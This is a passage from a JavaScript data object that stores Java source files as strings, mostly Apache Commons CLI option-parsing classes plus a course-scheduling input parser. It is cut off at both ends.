		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		/**
		 * Validates an Option string.
		 *
		 * @version $Id: OptionValidator.java 1544819 2013-11-23 15:34:31Z tn $
		 * @since 1.1
		 */
		final class OptionValidator
		{
		    /**
		     * Validates whether &ltcode&gtopt&lt/code&gt is a permissible Option
		     * shortOpt.  The rules that specify if the &ltcode&gtopt&lt/code&gt
		     * is valid are:
		     *
		     * &ltul&gt
		     *  &ltli&gta single character &ltcode&gtopt&lt/code&gt that is either
		     *  ' '(special case), '?', '@' or a letter&lt/li&gt
		     *  &ltli&gta multi character &ltcode&gtopt&lt/code&gt that only contains
		     *  letters.&lt/li&gt
		     * &lt/ul&gt
		     * &ltp&gt
		     * In case {@code opt} is {@code null} no further validation is performed.
		     *
		     * @param opt The option string to validate, may be null
		     * @throws IllegalArgumentException if the Option is not valid.
		     */
		    static void validateOption(String opt) throws IllegalArgumentException
		    {
		        // if opt is NULL do not check further
		        if (opt == null)
		        {
		            return;
		        }
		        
		        // handle the single character opt
		        if (opt.length() == 1)
		        {
		            char ch = opt.charAt(0);

		            if (!isValidOpt(ch))
		            {
		                throw new IllegalArgumentException("Illegal option name '" + ch + "'");
		            }
		        }

		        // handle the multi character opt
		        else
		        {
		            for (char ch : opt.toCharArray())
		            {
		                if (!isValidChar(ch))
		                {
		                    throw new IllegalArgumentException("The option '" + opt + "' contains an illegal "
		                                                       + "character : '" + ch + "'");
		                }
		            }
		        }
		    }

		    /**
		     * Returns whether the specified character is a valid Option.
		     *
		     * @param c the option to validate
		     * @return true if &ltcode&gtc&lt/code&gt is a letter, '?' or '@', otherwise false.
		     */
		    private static boolean isValidOpt(char c)
		    {
		        return isValidChar(c) || c == '?' || c == '@';
		    }

		    /**
		     * Returns whether the specified character is a valid character.
		     *
		     * @param c the character to validate
		     * @return true if &ltcode&gtc&lt/code&gt is a letter.
		     */
		    private static boolean isValidChar(char c)
		    {
		        return Character.isJavaIdentifierPart(c);
		    }
		}`
	},
	ai25: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		/**
		 * Base for Exceptions thrown during parsing of a command-line.
		 *
		 * @version $Id: ParseException.java 1443102 2013-02-06 18:12:16Z tn $
		 */
		public class ParseException extends Exception
		{
		    /**
		     * This exception {@code serialVersionUID}.
		     */
		    private static final long serialVersionUID = 9112808380089253192L;

		    /**
		     * Construct a new &ltcode&gtParseException&lt/code&gt
		     * with the specified detail message.
		     *
		     * @param message the detail message
		     */
		    public ParseException(String message)
		    {
		        super(message);
		    }
		}`
	},
	ai26: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.util.ArrayList;
		import java.util.Arrays;
		import java.util.Enumeration;
		import java.util.List;
		import java.util.ListIterator;
		import java.util.Properties;

		/**
		 * &ltcode&gtParser&lt/code&gt creates {@link CommandLine}s.
		 *
		 * @version $Id: Parser.java 1744812 2016-05-20 23:36:20Z ggregory $
		 * @deprecated since 1.3, the two-pass parsing with the flatten method is not enough flexible to handle complex cases
		 */
		@Deprecated
		public abstract class Parser implements CommandLineParser
		{
		    /** commandline instance */
		    protected CommandLine cmd;

		    /** current Options */
		    private Options options;

		    /** list of required options strings */
		    private List requiredOptions;

		    protected void setOptions(Options options)
		    {
		        this.options = options;
		        this.requiredOptions = new ArrayList(options.getRequiredOptions());
		    }

		    protected Options getOptions()
		    {
		        return options;
		    }

		    protected List getRequiredOptions()
		    {
		        return requiredOptions;
		    }

		    /**
		     * Subclasses must implement this method to reduce
		     * the &ltcode&gtarguments&lt/code&gt that have been passed to the parse method.
		     *
		     * @param opts The Options to parse the arguments by.
		     * @param arguments The arguments that have to be flattened.
		     * @param stopAtNonOption specifies whether to stop
		     * flattening when a non option has been encountered
		     * @return a String array of the flattened arguments
		     * @throws ParseException if there are any problems encountered
		     *                        while parsing the command line tokens.
		     */
		    protected abstract String[] flatten(Options opts, String[] arguments, boolean stopAtNonOption)
		            throws ParseException;

		    /**
		     * Parses the specified &ltcode&gtarguments&lt/code&gt based
		     * on the specified {@link Options}.
		     *
		     * @param options the &ltcode&gtOptions&lt/code&gt
		     * @param arguments the &ltcode&gtarguments&lt/code&gt
		     * @return the &ltcode&gtCommandLine&lt/code&gt
		     * @throws ParseException if there are any problems encountered
		     *                        while parsing the command line tokens.
		     */
		    public CommandLine parse(Options options, String[] arguments) throws ParseException
		    {
		        return parse(options, arguments, null, false);
		    }

		    /**
		     * Parse the arguments according to the specified options and properties.
		     *
		     * @param options    the specified Options
		     * @param arguments  the command line arguments
		     * @param properties command line option name-value pairs
		     * @return the list of atomic option and value tokens
		     * @throws ParseException if there are any problems encountered
		     *                        while parsing the command line tokens.
		     *
		     * @since 1.1
		     */
		    public CommandLine parse(Options options, String[] arguments, Properties properties) throws ParseException
		    {
		        return parse(options, arguments, properties, false);
		    }

		    /**
		     * Parses the specified &ltcode&gtarguments&lt/code&gt
		     * based on the specified {@link Options}.
		     *
		     * @param options         the &ltcode&gtOptions&lt/code&gt
		     * @param arguments       the &ltcode&gtarguments&lt/code&gt
		     * @param stopAtNonOption if &lttt&gttrue&lt/tt&gt an unrecognized argument stops
		     *     the parsing and the remaining arguments are added to the 
		     *     {@link CommandLine}s args list. If &lttt&gtfalse&lt/tt&gt an unrecognized
		     *     argument triggers a ParseException.
		     * @return the &ltcode&gtCommandLine&lt/code&gt
		     * @throws ParseException if an error occurs when parsing the arguments.
		     */
		    public CommandLine parse(Options options, String[] arguments, boolean stopAtNonOption) throws ParseException
		    {
		        return parse(options, arguments, null, stopAtNonOption);
		    }

		    /**
		     * Parse the arguments according to the specified options and
		     * properties.
		     *
		     * @param options the specified Options
		     * @param arguments the command line arguments
		     * @param properties command line option name-value pairs
		     * @param stopAtNonOption if &lttt&gttrue&lt/tt&gt an unrecognized argument stops
		     *     the parsing and the remaining arguments are added to the 
		     *     {@link CommandLine}s args list. If &lttt&gtfalse&lt/tt&gt an unrecognized
		     *     argument triggers a ParseException.
		     *
		     * @return the list of atomic option and value tokens
		     *
		     * @throws ParseException if there are any problems encountered
		     * while parsing the command line tokens.
		     *
		     * @since 1.1
		     */
		    public CommandLine parse(Options options, String[] arguments, Properties properties, boolean stopAtNonOption)
		            throws ParseException
		    {
		        // clear out the data in options in case it's been used before (CLI-71)
		        for (Option opt : options.helpOptions())
		        {
		            opt.clearValues();
		        }
		        
		        // clear the data from the groups
		        for (OptionGroup group : options.getOptionGroups())
		        {
		            group.setSelected(null);
		        }        

		        // initialise members
		        setOptions(options);

		        cmd = new CommandLine();

		        boolean eatTheRest = false;

		        if (arguments == null)
		        {
		            arguments = new String[0];
		        }

		        List&ltString&gt tokenList = Arrays.asList(flatten(getOptions(), arguments, stopAtNonOption));

		        ListIterator&ltString&gt iterator = tokenList.listIterator();

		        // process each flattened token
		        while (iterator.hasNext())
		        {
		            String t = iterator.next();

		            // the value is the double-dash
		            if ("--".equals(t))
		            {
		                eatTheRest = true;
		            }

		            // the value is a single dash
		            else if ("-".equals(t))
		            {
		                if (stopAtNonOption)
		                {
		                    eatTheRest = true;
		                }
		                else
		                {
		                    cmd.addArg(t);
		                }
		            }

		            // the value is an option
		            else if (t.startsWith("-"))
		            {
		                if (stopAtNonOption && !getOptions().hasOption(t))
		                {
		                    eatTheRest = true;
		                    cmd.addArg(t);
		                }
		                else
		                {
		                    processOption(t, iterator);
		                }
		            }

		            // the value is an argument
		            else
		            {
		                cmd.addArg(t);

		                if (stopAtNonOption)
		                {
		                    eatTheRest = true;
		                }
		            }

		            // eat the remaining tokens
		            if (eatTheRest)
		            {
		                while (iterator.hasNext())
		                {
		                    String str = iterator.next();

		                    // ensure only one double-dash is added
		                    if (!"--".equals(str))
		                    {
		                        cmd.addArg(str);
		                    }
		                }
		            }
		        }

		        processProperties(properties);
		        checkRequiredOptions();

		        return cmd;
		    }

		    /**
		     * Sets the values of Options using the values in &ltcode&gtproperties&lt/code&gt.
		     *
		     * @param properties The value properties to be processed.
		     * @throws ParseException if there are any problems encountered
		     *                        while processing the properties.
		     */
		    protected void processProperties(Properties properties) throws ParseException
		    {
		        if (properties == null)
		        {
		            return;
		        }

		        for (Enumeration&lt?&gt e = properties.propertyNames(); e.hasMoreElements();)
		        {
		            String option = e.nextElement().toString();
		            
		            Option opt = options.getOption(option);
		            if (opt == null)
		            {
		                throw new UnrecognizedOptionException("Default option wasn't defined", option);
		            }
		            
		            // if the option is part of a group, check if another option of the group has been selected
		            OptionGroup group = options.getOptionGroup(opt);
		            boolean selected = group != null && group.getSelected() != null;
		            
		            if (!cmd.hasOption(option) && !selected)
		            {
		                // get the value from the properties instance
		                String value = properties.getProperty(option);

		                if (opt.hasArg())
		                {
		                    if (opt.getValues() == null || opt.getValues().length == 0)
		                    {
		                        try
		                        {
		                            opt.addValueForProcessing(value);
		                        }
		                        catch (RuntimeException exp) //NOPMD
		                        {
		                            // if we cannot add the value don't worry about it
		                        }
		                    }
		                }
		                else if (!("yes".equalsIgnoreCase(value)
		                        || "true".equalsIgnoreCase(value)
		                        || "1".equalsIgnoreCase(value)))
		                {
		                    // if the value is not yes, true or 1 then don't add the
		                    // option to the CommandLine
		                    continue;
		                }

		                cmd.addOption(opt);
		                updateRequiredOptions(opt);
		            }
		        }
		    }

		    /**
		     * Throws a {@link MissingOptionException} if all of the required options
		     * are not present.
		     *
		     * @throws MissingOptionException if any of the required Options are not present.
		     */
		    protected void checkRequiredOptions() throws MissingOptionException
		    {
		        // if there are required options that have not been processed
		        if (!getRequiredOptions().isEmpty())
		        {
		            throw new MissingOptionException(getRequiredOptions());
		        }
		    }

		    /**
		     * Process the argument values for the specified Option
		     * &ltcode&gtopt&lt/code&gt using the values retrieved from the
		     * specified iterator &ltcode&gtiter&lt/code&gt.
		     *
		     * @param opt The current Option
		     * @param iter The iterator over the flattened command line Options.
		     *
		     * @throws ParseException if an argument value is required
		     * and it is has not been found.
		     */
		    public void processArgs(Option opt, ListIterator&ltString&gt iter) throws ParseException
		    {
		        // loop until an option is found
		        while (iter.hasNext())
		        {
		            String str = iter.next();
		            
		            // found an Option, not an argument
		            if (getOptions().hasOption(str) && str.startsWith("-"))
		            {
		                iter.previous();
		                break;
		            }

		            // found a value
		            try
		            {
		                opt.addValueForProcessing(Util.stripLeadingAndTrailingQuotes(str));
		            }
		            catch (RuntimeException exp)
		            {
		                iter.previous();
		                break;
		            }
		        }

		        if (opt.getValues() == null && !opt.hasOptionalArg())
		        {
		            throw new MissingArgumentException(opt);
		        }
		    }

		    /**
		     * Process the Option specified by &ltcode&gtarg&lt/code&gt using the values
		     * retrieved from the specified iterator &ltcode&gtiter&lt/code&gt.
		     *
		     * @param arg The String value representing an Option
		     * @param iter The iterator over the flattened command line arguments.
		     *
		     * @throws ParseException if &ltcode&gtarg&lt/code&gt does not represent an Option
		     */
		    protected void processOption(String arg, ListIterator&ltString&gt iter) throws ParseException
		    {
		        boolean hasOption = getOptions().hasOption(arg);

		        // if there is no option throw an UnrecognizedOptionException
		        if (!hasOption)
		        {
		            throw new UnrecognizedOptionException("Unrecognized option: " + arg, arg);
		        }

		        // get the option represented by arg
		        Option opt = (Option) getOptions().getOption(arg).clone();
		        
		        // update the required options and groups
		        updateRequiredOptions(opt);
		        
		        // if the option takes an argument value
		        if (opt.hasArg())
		        {
		            processArgs(opt, iter);
		        }
		        
		        // set the option on the command line
		        cmd.addOption(opt);
		    }

		    /**
		     * Removes the option or its group from the list of expected elements.
		     * 
		     * @param opt
		     */
		    private void updateRequiredOptions(Option opt) throws ParseException
		    {
		        // if the option is a required option remove the option from
		        // the requiredOptions list
		        if (opt.isRequired())
		        {
		            getRequiredOptions().remove(opt.getKey());
		        }

		        // if the option is in an OptionGroup make that option the selected
		        // option of the group
		        if (getOptions().getOptionGroup(opt) != null)
		        {
		            OptionGroup group = getOptions().getOptionGroup(opt);

		            if (group.isRequired())
		            {
		                getRequiredOptions().remove(group);
		            }

		            group.setSelected(opt);
		        }
		    }
		}`
	},
	ai27: {
		type: 'java',
		code: `
		import java.io.*;
		import java.util.ArrayList;
		import java.util.List;
		import java.util.NoSuchElementException;
		import java.util.Scanner;


		/* ParserJ
		* This is responsible for most of the logic for reading and storing the data from a text file to be used to design
		* An optimal solution to our scheduling problem
		* This allows for ease of access to all the data structures and the data within
		* Takes a filename as input
		 */
		public class ParserJ {
		    String name;
		    List&ltCourseSlot&gt courseSlotList= new ArrayList&lt&gt();
		    List&ltLabSlot&gt labsSlotList = new ArrayList&lt&gt();
		    List&ltCourse&gt courses = new ArrayList&lt&gt();
		    List&ltLab&gt labs = new ArrayList&lt&gt();
		    List&ltNotComp&gt notComps = new ArrayList&lt&gt();
		    List&ltUnwanted&gt unwanted = new ArrayList&lt&gt();
		    List&ltPreference&gt preferences = new ArrayList&lt&gt();
		    List&ltAPair&gt pairs = new ArrayList&lt&gt();
		    List&ltPartial&gt partials = new ArrayList&lt&gt();
		    public ParserJ(String fn){
		        File file = new File(fn);

		        try {
		            Scanner scan = new Scanner(file);
		            readFile(scan);
		        }
		        catch (FileNotFoundException e) {
		            throw new Error("An error occurred: " + e.getMessage());
		        }

		    }

		    public void readFile(Scanner sc){
		        String line;
		        try {
		            while (sc.hasNextLine()) {
		                line = sc.nextLine();
		                if (line.equals(null) | line.equals("")) {
		                    continue;
		                } else switch (line.trim()) {
		                    case "Name:":
		                        this.name = sc.nextLine();
		                        break;
		                    case "Course slots:":
		                        String ncs;
		                        while (!(ncs = sc.nextLine()).equals("")) {
		                            String[] arr = ncs.trim().split(",");
		                            String day = arr[0].trim();
		                            String start = arr[1].trim();
		                            int max = Integer.parseInt(arr[2].trim());
		                            int min = Integer.parseInt(arr[3].trim());
		                            courseSlotList.add(new CourseSlot(day, start, max, min));
		                        }
		                        break;
		                    case "Lab slots:":
		                        String nls;
		                        while (!(nls = sc.nextLine()).equals("")) {
		                            String[] arr = nls.trim().split(",");
		                            String day = arr[0].trim();
		                            String start = arr[1].trim();
		                            int max = Integer.parseInt(arr[2].trim());
		                            int min = Integer.parseInt(arr[3].trim());
		                            labsSlotList.add(new LabSlot(day, start, max, min));
		                        }
		                        break;
		                    case "Courses:":
		                        String nc;
		                        while (!(nc = sc.nextLine()).equals("")) {
		                            courses.add(new Course(nc));
		                        }
		                        break;
		                    case "Labs:":
		                        String nl;
		                        while (!(nl = sc.nextLine()).equals("")) {
		                            labs.add(new Lab(nl));
		                        }
		                        break;
		                    case "Not compatible:":
		                        String notc;
		                        while (!(notc = sc.nextLine()).equals("")) {
		                            notComps.add(new NotComp(notc));
		                        }
		                        break;
		                    case "Unwanted:":
		                        String uw;
		                        while (!(uw = sc.nextLine()).equals("")) {
		                            unwanted.add(new Unwanted(uw));
		                        }
		                        break;
		                    case "Preferences:":
		                        String pf;
		                        while (!(pf = sc.nextLine()).equals("")) {
		                            String[] arr = pf.split(",");
		                            String day = arr[0].trim();
		                            String time = arr[1].trim();
		                            String[] lecsec = arr[2].trim().split(" ");
		                            String faculty = "";
		                            int cnum = -1;
		                            int lsec = -1;
		                            int tsec = -1;
		                            if (lecsec.length == 4) {
		                                if (lecsec[2].trim().equals("LEC")) {
		                                    faculty = lecsec[0].trim();
		                                    cnum = Integer.parseInt(lecsec[1].trim());
		                                    lsec = Integer.parseInt(lecsec[3].trim());
		                                } else if (lecsec[2].trim().equals("TUT") | lecsec[2].trim().equals("LAB")) {
		                                    faculty = lecsec[0];
		                                    cnum = Integer.parseInt(lecsec[1].trim());
		                                    tsec = Integer.parseInt(lecsec[3].trim());
		                                }
		                            } else if (lecsec.length == 6) {
		                                faculty = lecsec[0];
		                                cnum = Integer.parseInt(lecsec[1].trim());
		                                lsec = Integer.parseInt(lecsec[3].trim());
		                                tsec = Integer.parseInt(lecsec[5].trim());
		                            }
		                            int weight = Integer.parseInt(arr[3].trim());
		                            preferences.add(new Preference(day, time, faculty, cnum, lsec, tsec, weight));
		                        }
		                        break;
		                    case "Pair:":
		                        String pr;
		                        while (!(pf = sc.nextLine()).equals("")) {
		                            pairs.add(new APair(pf));
		                        }
		                        break;
		                    case "Partial assignments:":
		                        String pa;
		                        while (!(pa = sc.nextLine()).equals("")) {
		                            partials.add(new Partial(pa));
		                        }
		                        break;
		                }
		            }

		        } catch (NoSuchElementException e){
		            sc.close();
		            return;
		        }
		    }
		}`
	},
	ai28: {
		type: 'java',
		code: `
		/* Partial
		 * A custom class used to store information about partial solutions
		 * Takes a string as input
		 * Contains get methods for all private variables
		 */

		public class Partial {

		    private final String day;
		    private final String time;
		    private String faculty;
		    private int cnum;
		    private int lsec;
		    private int tsec;


		    public Partial(String s){
		        String[] arr = s.split(",");
		        this.day = arr[1].trim();
		        this.time = arr[2].trim();
		        String[] arr1 = arr[0].trim().split(" ");
		        if(arr1.length &gt 4) {
		            int count = 0;
		            for (String st : arr1) {
		                if (st.equals("")) {
		                    count += 1;
		                }
		            }
		            String[] ndata = new String[arr1.length - count];
		            int i = 0;
		            for (String st : arr1){
		                if(!st.equals("")){
		                    ndata[i] = st;
		                    i += 1;
		                }
		            }
		            arr1 = ndata;
		        }
		        if(arr1.length == 4){
		            if(arr1[2].trim().equals("TUT") | arr1[2].trim().equals("LAB")){
		                this.faculty = arr1[0].trim();
		                this.cnum = Integer.parseInt(arr1[1].trim());
		                this.lsec = -1;
		                this.tsec = Integer.parseInt(arr1[3].trim());

		            }
		            else if(arr1[2].equals("LEC")){
		                this.faculty = arr1[0].trim();
		                this.cnum = Integer.parseInt(arr1[1].trim());
		                this.lsec = Integer.parseInt(arr1[3].trim());
		                this.tsec = -1;
		            }
		        }
		        else if(arr1.length == 6){
		            if(arr1[2].equals("LEC")) {
		                this.faculty = arr1[0].trim();
		                this.cnum = Integer.parseInt(arr1[1].trim());
		                this.lsec = Integer.parseInt(arr1[3].trim());
		                this.tsec = Integer.parseInt(arr1[5].trim());
		            }
		            else if(arr1[4].equals("LEC")){
		                this.faculty = arr1[0].trim();
		                this.cnum = Integer.parseInt(arr1[1].trim());
		                this.tsec = Integer.parseInt(arr1[3].trim());
		                this.lsec = Integer.parseInt(arr1[5].trim());
		            }
		        }
		    }

		    public String getDay(){ return this.day; }
		    public String getTime() { return this.time; }
		    public String getFaculty() { return this.faculty; }
		    public int getCourseNum() { return this.cnum; }
		    public int getLecSec() { return this.lsec; }
		    public int getTutSec() { return this.tsec; }

		}`
	},
	ai29: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.io.File;
		import java.io.FileInputStream;
		import java.net.URL;
		import java.util.Date;

		/**
		 * &ltp&gtAllows Options to be created from a single String.
		 * The pattern contains various single character flags and via
		 * an optional punctuation character, their expected type.
		 * &lt/p&gt
		 * 
		 * &lttable border="1"&gt
		 *   &ltcaption&gtOverview of PatternOptionBuilder patterns&lt/caption&gt
		 *   &lttr&gt&lttd&gta&lt/td&gt&lttd&gt-a flag&lt/td&gt&lt/tr&gt
		 *   &lttr&gt&lttd&gtb@&lt/td&gt&lttd&gt-b [classname]&lt/td&gt&lt/tr&gt
		 *   &lttr&gt&lttd&gtc&gt;&lt/td&gt&lttd&gt-c [filename]&lt/td&gt&lt/tr&gt
		 *   &lttr&gt&lttd&gtd+&lt/td&gt&lttd&gt-d [classname] (creates object via empty constructor)&lt/td&gt&lt/tr&gt
		 *   &lttr&gt&lttd&gte%&lt/td&gt&lttd&gt-e [number] (creates Double/Long instance depending on existing of a '.')&lt/td&gt&lt/tr&gt
		 *   &lttr&gt&lttd&gtf/&lt/td&gt&lttd&gt-f [url]&lt/td&gt&lt/tr&gt
		 *   &lttr&gt&lttd&gtg:&lt/td&gt&lttd&gt-g [string]&lt/td&gt&lt/tr&gt
		 * &lt/table&gt
		 * 
		 * &ltp&gt
		 * For example, the following allows command line flags of '-v -p string-value -f /dir/file'.
		 * The exclamation mark precede a mandatory option.
		 * &lt/p&gt
		 *
		 * &ltpre&gt
		 *     Options options = PatternOptionBuilder.parsePattern("vp:!f/");
		 * &lt/pre&gt
		 *
		 * &ltp&gt
		 * TODO: These need to break out to OptionType and also to be pluggable.
		 * &lt/p&gt
		 *
		 * @version $Id: PatternOptionBuilder.java 1677406 2015-05-03 14:27:31Z britter $
		 */
		public class PatternOptionBuilder
		{
		    /** String class */
		    public static final Class&ltString&gt STRING_VALUE = String.class;

		    /** Object class */
		    public static final Class&ltObject&gt OBJECT_VALUE = Object.class;

		    /** Number class */
		    public static final Class&ltNumber&gt NUMBER_VALUE = Number.class;

		    /** Date class */
		    public static final Class&ltDate&gt DATE_VALUE = Date.class;

		    /** Class class */
		    public static final Class&lt?&gt CLASS_VALUE = Class.class;

		    /// can we do this one??
		    // is meant to check that the file exists, else it errors.
		    // ie) it's for reading not writing.

		    /** FileInputStream class */
		    public static final Class&ltFileInputStream&gt EXISTING_FILE_VALUE = FileInputStream.class;

		    /** File class */
		    public static final Class&ltFile&gt FILE_VALUE = File.class;

		    /** File array class */
		    public static final Class&ltFile[]&gt FILES_VALUE = File[].class;

		    /** URL class */
		    public static final Class&ltURL&gt URL_VALUE = URL.class;

		    /**
		     * Retrieve the class that &ltcode&gtch&lt/code&gt represents.
		     *
		     * @param ch the specified character
		     * @return The class that &ltcode&gtch&lt/code&gt represents
		     */
		    public static Object getValueClass(char ch)
		    {
		        switch (ch)
		        {
		            case '@':
		                return PatternOptionBuilder.OBJECT_VALUE;
		            case ':':
		                return PatternOptionBuilder.STRING_VALUE;
		            case '%':
		                return PatternOptionBuilder.NUMBER_VALUE;
		            case '+':
		                return PatternOptionBuilder.CLASS_VALUE;
		            case '#':
		                return PatternOptionBuilder.DATE_VALUE;
		            case '&lt':
		                return PatternOptionBuilder.EXISTING_FILE_VALUE;
		            case '&gt':
		                return PatternOptionBuilder.FILE_VALUE;
		            case '*':
		                return PatternOptionBuilder.FILES_VALUE;
		            case '/':
		                return PatternOptionBuilder.URL_VALUE;
		        }

		        return null;
		    }

		    /**
		     * Returns whether &ltcode&gtch&lt/code&gt is a value code, i.e.
		     * whether it represents a class in a pattern.
		     *
		     * @param ch the specified character
		     * @return true if &ltcode&gtch&lt/code&gt is a value code, otherwise false.
		     */
		    public static boolean isValueCode(char ch)
		    {
		        return ch == '@'
		                || ch == ':'
		                || ch == '%'
		                || ch == '+'
		                || ch == '#'
		                || ch == '&lt'
		                || ch == '&gt'
		                || ch == '*'
		                || ch == '/'
		                || ch == '!';
		    }

		    /**
		     * Returns the {@link Options} instance represented by &ltcode&gtpattern&lt/code&gt.
		     *
		     * @param pattern the pattern string
		     * @return The {@link Options} instance
		     */
		    public static Options parsePattern(String pattern)
		    {
		        char opt = ' ';
		        boolean required = false;
		        Class&lt?&gt type = null;

		        Options options = new Options();

		        for (int i = 0; i &lt pattern.length(); i++)
		        {
		            char ch = pattern.charAt(i);

		            // a value code comes after an option and specifies
		            // details about it
		            if (!isValueCode(ch))
		            {
		                if (opt != ' ')
		                {
		                    final Option option = Option.builder(String.valueOf(opt))
		                        .hasArg(type != null)
		                        .required(required)
		                        .type(type)
		                        .build();
		                    
		                    // we have a previous one to deal with
		                    options.addOption(option);
		                    required = false;
		                    type = null;
		                    opt = ' ';
		                }

		                opt = ch;
		            }
		            else if (ch == '!')
		            {
		                required = true;
		            }
		            else
		            {
		                type = (Class&lt?&gt) getValueClass(ch);
		            }
		        }

		        if (opt != ' ')
		        {
		            final Option option = Option.builder(String.valueOf(opt))
		                .hasArg(type != null)
		                .required(required)
		                .type(type)
		                .build();
		            
		            // we have a final one to deal with
		            options.addOption(option);
		        }

		        return options;
		    }
		}`
	},
	ai30: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.util.ArrayList;
		import java.util.Arrays;
		import java.util.Iterator;
		import java.util.List;

		/**
		 * The class PosixParser provides an implementation of the
		 * {@link Parser#flatten(Options,String[],boolean) flatten} method.
		 *
		 * @version $Id: PosixParser.java 1783175 2017-02-16 07:52:05Z britter $
		 * @deprecated since 1.3, use the {@link DefaultParser} instead
		 */
		@Deprecated
		public class PosixParser extends Parser
		{
		    /** holder for flattened tokens */
		    private final List&ltString&gt tokens = new ArrayList&ltString&gt();

		    /** specifies if bursting should continue */
		    private boolean eatTheRest;

		    /** holder for the current option */
		    private Option currentOption;

		    /** the command line Options */
		    private Options options;

		    /**
		     * Resets the members to their original state i.e. remove
		     * all of &ltcode&gttokens&lt/code&gt entries and set &ltcode&gteatTheRest&lt/code&gt
		     * to false.
		     */
		    private void init()
		    {
		        eatTheRest = false;
		        tokens.clear();
		    }

		    /**
		     * &ltp&gtAn implementation of {@link Parser}'s abstract
		     * {@link Parser#flatten(Options,String[],boolean) flatten} method.&lt/p&gt
		     *
		     * &ltp&gtThe following are the rules used by this flatten method.&lt/p&gt
		     * &ltol&gt
		     *  &ltli&gtif &ltcode&gtstopAtNonOption&lt/code&gt is &ltb&gttrue&lt/b&gt then do not
		     *  burst anymore of &ltcode&gtarguments&lt/code&gt entries, just add each
		     *  successive entry without further processing.  Otherwise, ignore
		     *  &ltcode&gtstopAtNonOption&lt/code&gt.&lt/li&gt
		     *  &ltli&gtif the current &ltcode&gtarguments&lt/code&gt entry is "&ltb&gt--&lt/b&gt"
		     *  just add the entry to the list of processed tokens&lt/li&gt
		     *  &ltli&gtif the current &ltcode&gtarguments&lt/code&gt entry is "&ltb&gt-&lt/b&gt"
		     *  just add the entry to the list of processed tokens&lt/li&gt
		     *  &ltli&gtif the current &ltcode&gtarguments&lt/code&gt entry is two characters
		     *  in length and the first character is "&ltb&gt-&lt/b&gt" then check if this
		     *  is a valid {@link Option} id.  If it is a valid id, then add the
		     *  entry to the list of processed tokens and set the current {@link Option}
		     *  member.  If it is not a valid id and &ltcode&gtstopAtNonOption&lt/code&gt
		     *  is true, then the remaining entries are copied to the list of
		     *  processed tokens.  Otherwise, the current entry is ignored.&lt/li&gt
		     *  &ltli&gtif the current &ltcode&gtarguments&lt/code&gt entry is more than two
		     *  characters in length and the first character is "&ltb&gt-&lt/b&gt" then
		     *  we need to burst the entry to determine its constituents.  For more
		     *  information on the bursting algorithm see
		     *  {@link PosixParser#burstToken(String, boolean) burstToken}.&lt/li&gt
		     *  &ltli&gtif the current &ltcode&gtarguments&lt/code&gt entry is not handled
		     *  by any of the previous rules, then the entry is added to the list
		     *  of processed tokens.&lt/li&gt
		     * &lt/ol&gt
		     *
		     * @param options The command line {@link Options}
		     * @param arguments The command line arguments to be parsed
		     * @param stopAtNonOption Specifies whether to stop flattening
		     * when an non option is found.
		     * @return The flattened &ltcode&gtarguments&lt/code&gt String array.
		     */
		    @Override
		    protected String[] flatten(Options options, String[] arguments, boolean stopAtNonOption) throws ParseException
		    {
		        init();
		        this.options = options;

		        // an iterator for the command line tokens
		        Iterator&ltString&gt iter = Arrays.asList(arguments).iterator();

		        // process each command line token
		        while (iter.hasNext())
		        {
		            // get the next command line token
		            String token = iter.next();

		            // single or double hyphen
		            if ("-".equals(token) || "--".equals(token))
		            {
		                tokens.add(token);
		            }
		            
		            // handle long option --foo or --foo=bar
		            else if (token.startsWith("--"))
		            {
		                int pos = token.indexOf('=');
		                String opt = pos == -1 ? token : token.substring(0, pos); // --foo
